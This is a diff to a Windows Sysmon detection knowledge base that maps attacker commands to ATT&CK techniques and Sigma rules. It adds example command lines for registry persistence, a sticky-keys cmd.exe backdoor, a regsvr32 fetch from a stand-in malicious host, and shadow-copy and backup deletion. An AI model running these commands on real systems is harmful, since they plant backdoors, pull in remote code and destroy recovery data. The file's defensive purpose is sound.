@@ -1,6 +1,6 @@
 {
   "platform": "windows-sysmon",
-  "note": "Seed knowledge base. Detection references are representative of publicly available Sigma logic (SigmaHQ) and should be validated against your deployed ruleset. Telemetry assumes a Windows host with Sysmon (and/or the Security event log with command-line + module auditing) emitting process, network, registry, and file events.",
+  "note": "Seed knowledge base. Detection references are representative of publicly available Sigma logic (SigmaHQ) and should be validated against your deployed ruleset. Telemetry assumes a Windows host with Sysmon (and/or the Security event log with command-line + module auditing) emitting process, network, registry, and file events. An entry with no `detections` is deliberate: no published rule covers the action, and claiming one would be worse than claiming none. Find these with --coverage-gaps and generate a starter rule with --scaffold.",
   "entries": [
     {
       "id": "whoami",
@@ -45,7 +45,6 @@
       "description": "Network connection discovery",
       "techniques": [{ "id": "T1049", "name": "System Network Connections Discovery" }],
       "telemetry": ["Sysmon EID 1: netstat.exe -ano"],
-      "detections": [{ "source": "Sigma", "rule": "Network connection discovery (proc_creation_win)", "confidence": "low" }],
       "noise": 40
     },
     {
@@ -141,10 +140,11 @@
     {
       "id": "run-key-persist",
       "match": { "line": { "contains": "currentversion\\run" }, "event": { "class": "registry", "field": "TargetObject", "contains": "\\CurrentVersion\\Run" } },
+      "example": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Users\\Public\\x.exe /f",
       "description": "Writing a Run key — registry autostart persistence",
       "techniques": [{ "id": "T1547.001", "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder" }],
       "telemetry": ["Sysmon EID 13 (Registry Set) under ...\\CurrentVersion\\Run"],
-      "detections": [{ "source": "Sigma", "rule": "Run key modification (registry_set_win)", "confidence": "high" }],
+      "detections": [{ "source": "Sigma", "rule": "Run key modification via reg.exe (proc_creation_win) / registry_set_win", "confidence": "high" }],
       "noise": 65
     },
     {
@@ -262,6 +262,7 @@
     {
       "id": "regsvr32-squiblydoo",
       "match": { "line": { "contains": "scrobj.dll" } },
+      "example": "regsvr32.exe /s /n /u /i:http://evil.example/a.sct scrobj.dll",
       "description": "regsvr32 scrobj.dll (Squiblydoo) — LOLBin proxy execution",
       "techniques": [{ "id": "T1218.010", "name": "System Binary Proxy Execution: Regsvr32" }],
       "telemetry": ["Sysmon EID 1: regsvr32.exe /i:<url> scrobj.dll", "Sysmon EID 7 (Image Loaded) scrobj.dll"],
@@ -379,6 +380,7 @@
     {
       "id": "bcdedit-recovery",
       "match": { "program": "bcdedit" },
+      "example": "bcdedit.exe /set {default} recoveryenabled no",
       "description": "Modifying boot configuration — inhibit system recovery",
       "techniques": [{ "id": "T1490", "name": "Inhibit System Recovery" }],
       "telemetry": ["Sysmon EID 1: bcdedit.exe /set ... recoveryenabled no"],
@@ -388,6 +390,7 @@
     {
       "id": "attrib-hidden",
       "match": { "program": "attrib", "args": { "contains": "+h" } },
+      "example": "attrib.exe +h +s C:\\Users\\Public\\x.exe",
       "description": "Setting the hidden attribute — hide artifacts",
       "techniques": [{ "id": "T1564.001", "name": "Hide Artifacts: Hidden Files and Directories" }],
       "telemetry": ["Sysmon EID 1: attrib.exe +h"],
@@ -683,10 +686,11 @@
     {
       "id": "accessibility-sethc",
       "match": { "line": { "contains": "sethc.exe" } },
+      "example": "reg.exe add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f",
       "description": "Accessibility feature hijack (sticky keys / utilman) — persistence / backdoor",
       "techniques": [{ "id": "T1546.008", "name": "Event Triggered Execution: Accessibility Features" }],
       "telemetry": ["Sysmon EID 13 (Registry Set): IFEO Debugger for sethc.exe/utilman.exe", "Sysmon EID 11 (File Create): replacement of sethc.exe"],
-      "detections": [{ "source": "Sigma", "rule": "Accessibility feature hijack (registry_set_win)", "confidence": "high" }],
+      "detections": [{ "source": "Sigma", "rule": "Accessibility debugger registration (proc_creation_win) / registry_set_win", "confidence": "high" }],
       "noise": 65
     },
     {
@@ -711,7 +715,10 @@
       "id": "cmdkey-creds",
       "match": { "program": "cmdkey", "args": { "contains": "/list" } },
       "description": "Enumerating stored credentials via cmdkey — Credential Manager access",
-      "techniques": [{ "id": "T1555.004", "name": "Credentials from Password Stores: Windows Credential Manager" }],
+      "techniques": [
+        { "id": "T1555.004", "name": "Credentials from Password Stores: Windows Credential Manager" },
+        { "id": "T1003.005", "name": "OS Credential Dumping: Cached Domain Credentials" }
+      ],
       "telemetry": ["Sysmon EID 1: cmdkey.exe /list enumerating saved credentials"],
       "detections": [{ "source": "Sigma", "rule": "Credential Manager enumeration via cmdkey (proc_creation_win)", "confidence": "medium" }],
       "noise": 45
@@ -729,10 +736,14 @@
     {
       "id": "av-discovery",
       "match": { "line": { "contains": "antivirusproduct" } },
+      "example": "wmic.exe /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName",
       "description": "Enumerating installed AV via the AntiVirusProduct WMI class — security-software discovery",
-      "techniques": [{ "id": "T1518.001", "name": "Software Discovery: Security Software Discovery" }],
+      "techniques": [
+        { "id": "T1518.001", "name": "Software Discovery: Security Software Discovery" },
+        { "id": "T1047", "name": "Windows Management Instrumentation" }
+      ],
       "telemetry": ["Sysmon EID 1: wmic querying AntiVirusProduct in root\\SecurityCenter2"],
-      "detections": [{ "source": "Sigma", "rule": "Security software discovery (proc_creation_win)", "confidence": "low" }],
+      "detections": [{ "source": "Sigma", "rule": "Product class reconnaissance via wmic (proc_creation_win)", "confidence": "low" }],
       "noise": 45
     },
     {
@@ -756,6 +767,7 @@
     {
       "id": "wmic-shadow-delete",
       "match": { "line": { "contains": "shadowcopy delete" } },
+      "example": "wmic.exe shadowcopy delete /nointeractive",
       "description": "Deleting volume shadow copies via wmic — inhibit system recovery",
       "techniques": [{ "id": "T1490", "name": "Inhibit System Recovery" }],
       "telemetry": ["Sysmon EID 1: wmic shadowcopy delete"],
@@ -765,10 +777,11 @@
     {
       "id": "wbadmin-delete",
       "match": { "program": "wbadmin", "args": { "contains": "delete" } },
+      "example": "wbadmin.exe delete systemstatebackup -quiet",
       "description": "Deleting backups/catalog via wbadmin — inhibit system recovery",
       "techniques": [{ "id": "T1490", "name": "Inhibit System Recovery" }],
       "telemetry": ["Sysmon EID 1: wbadmin delete catalog/backup"],
-      "detections": [{ "source": "Sigma", "rule": "Backup deletion via wbadmin (proc_creation_win)", "confidence": "high" }],
+      "detections": [{ "source": "Sigma", "rule": "Backup/systemstatebackup deletion via wbadmin (proc_creation_win); the catalog-only form is uncovered", "confidence": "medium" }],
       "noise": 68
     },
     {
